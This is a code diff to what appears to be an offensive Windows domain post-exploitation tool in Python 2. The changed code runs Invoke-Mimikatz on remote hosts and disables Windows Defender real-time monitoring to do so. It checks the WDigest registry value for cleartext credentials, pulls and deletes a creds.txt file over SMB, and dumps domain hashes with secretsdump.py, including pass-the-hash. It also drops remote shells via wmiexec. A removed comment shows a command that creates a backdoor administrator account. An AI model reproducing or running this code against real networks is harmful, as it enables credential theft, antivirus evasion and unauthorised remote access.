@@ -623,7 +623,7 @@ def datadump(user, passw, host, path, os_version):
 				except:
 					print colored("[-]Something went wrong ...",'red')
 
-			if stealth_mimi in yesanswers:
+			if stealth_mimi in yesanswers or stealth_mimi=="AV":
 				try:
 					print colored("[+]Checking for Invoke-Mimikatz.ps1",'green')
 					if not os.path.isfile('./a'):
@@ -650,7 +650,7 @@ def datadump(user, passw, host, path, os_version):
 					
 					x=' '
 					
-					if "Windows 10.0" in os_version:
+					if stealth_mimi=="AV":
 						#Get Windows Defender status and store status
 						print colored("[+]Getting Windows Defender Status",'yellow')
 						line="Get-MpPreference | fl DisableRealtimeMonitoring"
@@ -665,7 +665,7 @@ def datadump(user, passw, host, path, os_version):
 							print colored("[+]Windows Defender RealTimeMonitoring Turned Off",'yellow')
 							AVstatus='Off'
 
-					if "Windows 10.0" in os_version:
+					if stealth_mimi=="AV":
 						
 						#If it is a later Windows version check the UseLogonCredentials reg value to see whether cleartext creds will be available						
 						proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\" /v \"UseLogonCredential\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
@@ -674,7 +674,6 @@ def datadump(user, passw, host, path, os_version):
 							print colored("[-]The reg value UseLogonCredential is set to 0 - no cleartext credentials will be available, use the -rW e/d/q parameter to modify this value",'green')
 						else:
 							print colored("[+]UseLogonCredential Registry Value is set to 1 - cleartext credentials will be hopefully be available",'green')
-
 						
 						#If Windows Defender is turned on turn off 
 						if AVstatus=='On':
@@ -698,7 +697,7 @@ def datadump(user, passw, host, path, os_version):
 					os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+host+"; get creds.txt\' 2>/dev/null")
 					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd.exe /C del c:\\creds.txt\" 2>/dev/null")
 					
-					if "Windows 10.0" in os_version:
+					if stealth_mimi=="AV":
 						#If Windows Defender AV status was on, turn it back on
 						if AVstatus=='On':
 							if response in yesanswers:	
@@ -2311,30 +2310,40 @@ if drsuapi in yesanswers:
 				print colored("[+]Creating directory for host: "+outputpath+targets[0],'green')
 			else:
 				print colored("[+]Found directory for: "+outputpath+targets[0],'green')
-			print colored("[+]Saving hashes to: "+outputpath+targets[0]+'/drsuapi_gethashes.txt','yellow')
-			pwdumpmatch = re.compile('^([0-9a-fA-F]{32}):([0-9a-fA-F]{32}):.*?:.*?:\s*$')
-			pwdump = pwdumpmatch.match(passw)
 			
-			if pwdump:
-				passw=passw[0:-3]
+			if os.path.isfile(outputpath+targets[0]+'/drsuapi_gethashes.txt'):
+				print colored("\n[+]WARNING",'red')
+				response = raw_input("Looks like you have an existing file "+outputpath+targets[0]+'/drsuapi_gethashes.txt'+", do you want to overwrite?: Y/(N) ")
+				if response in yesanswers:	
 
-			if pwdump:
-				os.system("/usr/local/bin/secretsdump.py -hashes "+passw+' '+domain_name+'/'+user+'\\'+'@'+targets[0] +'> '+outputpath+targets[0]+'/drsuapi_gethashes.txt')
-			else:
-				os.system("/usr/local/bin/secretsdump.py "+domain_name+'/'+user+':'+passw+'\\'+'@'+targets[0] +'> '+outputpath+targets[0]+'/drsuapi_gethashes.txt')
-			if os.path.isfile(outputpath+targets[0]+"/drsuapi_gethashes.txt"):
-				print colored("[+]Found file - completed : "+outputpath+targets[0],'green')
-				hashparse(outputpath+targets[0],'/drsuapi_gethashes.txt')
+					print colored("[+]Saving hashes to: "+outputpath+targets[0]+'/drsuapi_gethashes.txt','yellow')
+					pwdumpmatch = re.compile('^([0-9a-fA-F]{32}):([0-9a-fA-F]{32}):.*?:.*?:\s*$')
+					pwdump = pwdumpmatch.match(passw)
+			
+					if pwdump:
+						passw=passw[0:-3]
+
+					if pwdump:
+						os.system("/usr/local/bin/secretsdump.py -hashes "+passw+' '+domain_name+'/'+user+'\\'+'@'+targets[0] +'> '+outputpath+targets[0]+'/drsuapi_gethashes.txt')
+					else:
+						os.system("/usr/local/bin/secretsdump.py "+domain_name+'/'+user+':'+passw+'\\'+'@'+targets[0] +'> '+outputpath+targets[0]+'/drsuapi_gethashes.txt')
+					
+					if os.path.isfile(outputpath+targets[0]+"/drsuapi_gethashes.txt"):
+						print colored("[+]Found file - completed : "+outputpath+targets[0],'green')
+						hashparse(outputpath+targets[0],'/drsuapi_gethashes.txt')
 				
-				if qldap in yesanswers:
-					print colored("[+]Checking LM User Account Status",'yellow')
-					userstatus(outputpath,targets[0],'lm_usernames.txt')
-					print colored("[+]Checking NT User Account Status",'yellow')
-					userstatus(outputpath,targets[0],'nt_usernames.txt')
+						if qldap in yesanswers:
+							print colored("[+]Checking LM User Account Status",'yellow')
+							userstatus(outputpath,targets[0],'lm_usernames.txt')
+							print colored("[+]Checking NT User Account Status",'yellow')
+							userstatus(outputpath,targets[0],'nt_usernames.txt')
 				
-				sys.exit()
+						sys.exit()
+				else:
+					sys.exit()
 			else:
-				print colored("[-]Something has gone horribly wrong......",'red')
+				print colored("[-]Something has gone wrong......",'red')
+		
 		except OSError:
 			print colored("[-]Something went wrong using the drsuapi method",'red')
 	else:
@@ -2518,9 +2527,7 @@ if dropshell in yesanswers:
 				print colored ('\n[+] Dropping WMI Based Shell on '+targets[0]+'\n','yellow')
 				os.system("wmiexec.py "+user+"@"+targets[0]+" -no-pass 2>/dev/null")
 				sys.exit()
-			else:
-				#Check here whether we want a system shell or a shell in the context of the passed creds
-				#cmd.exe /c net user rottenadmin P@ssword123! /ADD && net localgroup Administrators rottenadmin /ADD
+			else:				
 				response = raw_input("Would you like a shell with SYSTEM Privileges?: Y/(N) ")
 				if response in yesanswers:	
 					print colored ('\n[+] Dropping a SYSTEM Shell on '+targets[0]+'\n','yellow')
